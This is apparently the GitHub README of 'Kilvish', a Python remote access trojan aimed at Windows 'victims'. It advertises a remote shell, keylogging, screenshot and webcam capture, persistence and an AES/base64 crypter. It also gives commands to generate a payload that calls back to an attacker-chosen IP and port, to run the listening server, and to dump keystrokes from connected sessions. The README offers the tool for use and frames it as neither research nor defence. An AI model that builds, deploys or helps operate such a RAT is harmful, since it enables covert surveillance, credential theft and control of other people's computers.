<h1 align="center"> 
    <img src="https://github.com/siddhant385/KilvishRAT/blob/master/.github/kilvish.jpg?raw=true" alt="KILVISH" /> <br>    
    KILVISH
</h1>
<p align="center">
    <a href="#" target="_blank"><img src="https://img.shields.io/badge/platform-cross-important" alt="platform: cross" /></a>
    <a href="https://www.python.org/" target="_blank"><img src="https://img.shields.io/badge/Python-3-yellow.svg?logo=python" alt="Python: 3" /></a>
    <a href="https://github.com/siddhant385/Kilvish/releases" target="_blank"><img src="https://img.shields.io/badge/version-v1.0-blue.svg?logo=moo" alt="Release: v1.0" /></a>
    <a href="https://opensource.org/licenses/MIT" target="_blank"><img src="https://img.shields.io/badge/license-MIT-green.svg" alt="lisence" /></a>
</p>
<h4 align="center"> A Cross Platform multifunctional (Windows/Linux/Mac) RAT but for now victim is only windows User.</h4>

<h6 align="center"><img src="https://github.com/siddhant385/KilvishRAT/blob/master/.github/1.png?raw=true"></h6>

## Getting Started
### Description
A  crossplatform RAT written in pure Python with some powershell scripts. The RAT accept commands alongside arguments to either perform as the server who accepts connections or to perform as the client/target who establish connections to the server. The **generate** command uses the module **pyinstaller** to compile the actual payload code. So, in order to generate payload file for your respective platform, you need to be on that platform while generating the file. Moreover, you can directly get the source file as well. 

### Features
<ul>
    <li>Built-in Shell for command execution</li>
    <li>Dumping System Information including drives and rams</li>
    <li>Screenshot module. Captures screenshot of client screen.</li>
    <li>Webcam module. Captures Webcam of client screen.(Thanks to Bainky/RAT)</li>
    <li>Connection Loop (Will continue on connecting to server)</li>
    <li>Currently, it uses BASE64 encoding for connection. </li>
    <li>Encrypts the payload using AES Encryption (Thanks to pushpendraindia)</li>
    <li>Pure Python</li>
    <li>Cross Platform. (Tested on Linux. Errors are accepted)</li>
    <li>Voice commands(Thanks to samratashok/nishang)</li>
    <li>Additional system info (Thanks to samratashok/nishang)</li>
    <li>Persistent</li>
    <li>Source File included for testing</li>
    <li>Less than 10 mb executble file/li>
    <li>Built in Crypter for encoding in base64 and AES</li>
    <li>Pushing Notifications when a client connects with plyer</li>
    <li>Python 3</li>
</ul>

### To be expected in future
<ul>
    <li>Stealth Execution</li>
    <li>Encryption</li>
    <li>Storing Sessions from last attempt</li>
    
</ul>

### Installation
The tool is tested on **Windows 10** with **Python 3.9**. 
Follow the steps for installation:
```
$ git clone https://github.com/siddhant385/Kilvish.git
$ cd Kilvish/
$ pip3 install -r requirements.txt
```

## Documentation
### Generating Payload
You can get the payload file in two ways: 
<ul>
    <li>Source File</li>
    <li>Compiled File</li>
</ul>
The source file is to remain same on all platforms. So, you can generate it on one platform and use it on the other. Getting the source file: 

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/payload.py --source
```

The compiled version has to generated on the respective platform. For example, you can't generate an .exe file on Linux. You specifically have to be on Windows. The tool is still under testing. So, all kinds of errors are accepted. Make sure to open an issue though. Generating the Compiled Version for Linux:

```
$ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
```

<h6 align="center"><img src="https://github.com/siddhant385/KilvishRAT/blob/master/.github/2.png?raw=true"></h6>

Replace your IP Address and Port on above commands. 

### Running Server
The server must be executed on Linux. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
```
$ python3 kilvish.py bind --address 0.0.0.0 --port 2999
```

### Connections
All the connections will be listed under **sessions** command:
```
$ sessions
```

<h6 align="center"><img src="https://github.com/siddhant385/KilvishRAT/blob/master/.github/3.png?raw=true"></h6>

You can connect to you target session with **connect** command and launch one of available commands: 
```
$ connect ID
$ keylogger on
$ keylogger dump
$ screenshot
```

<h6 align="center"><img src="https://github.com/siddhant385/KilvishRAT/blob/master/.github/4.png?raw=true"></h6>

### Help
Get a list of available commands: 
```
$ help
```

Help on a Specific Command:
```
$ help COMMAND
```

### Support my work By giving a Star
### FORK IT FOR CONTRIBUTION


### ORIGINAL CREATOR OF SILLYRAT WHICH IS MODIFIED TO CREATE KILVISH
Twitter: <a href="//twitter.com/hash3liZer">@hash3liZer</a><br>
Discord: TheFlash2k#0407
